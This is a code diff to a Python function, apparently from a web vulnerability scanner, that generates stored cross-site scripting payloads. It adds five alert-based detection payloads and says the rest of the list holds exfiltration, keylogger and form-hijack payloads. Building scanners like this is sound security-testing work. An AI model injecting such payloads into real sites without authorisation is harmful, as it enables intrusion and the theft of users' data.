@@ -294,10 +294,24 @@ def modern_browser_payloads(marker: Optional[str] = None) -> List[str]:
 
 
 def stored_xss_payloads(marker: Optional[str] = None) -> List[str]:
-  """Return stored XSS payloads: keylogger, form hijack, WebSocket, localStorage, etc."""
+  """Return stored XSS payloads.
+
+  Detection payloads come first — they embed the marker directly in the HTML
+  response so that the revisit-based ``_marker_in`` check can confirm storage.
+  Exfil / advanced payloads follow for breadth.
+  """
   if marker is None:
     marker = make_confirm_marker()
-  return [p.format(marker=marker) for p in STORED_XSS]
+  # Short, server-reflectable detection payloads placed first so the revisit
+  # check fires as early as possible.
+  detection: List[str] = [
+    f"<img src=x onerror=alert('{marker}')>",
+    f"<svg onload=alert('{marker}')>",
+    f"<script>alert('{marker}')</script>",
+    f"<body onload=alert('{marker}')>",
+    f"<details open ontoggle=alert('{marker}')>",
+  ]
+  return detection + [p.format(marker=marker) for p in STORED_XSS]
 
 
 def unicode_case_bypass_payloads(marker: Optional[str] = None) -> List[str]:
